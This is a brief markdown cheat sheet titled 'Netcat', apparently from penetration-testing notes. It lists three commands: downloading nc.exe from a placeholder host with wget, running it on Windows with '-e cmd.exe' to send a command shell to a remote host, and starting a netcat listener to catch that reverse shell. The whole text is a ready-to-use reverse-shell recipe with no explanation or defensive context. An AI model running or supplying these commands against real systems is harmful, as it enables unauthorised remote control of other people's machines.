---
description: Network Cat
---

# Netcat

### Get file

```bash
wget http://<HostIP>/nc.exe -outfile nc.exe
```

### Run  Windows

```bash
.\nc.exe -e cmd.exe <HostIP> <Port>
```

### Listening&#x20;

```bash
nc -nvlp <Port>
```
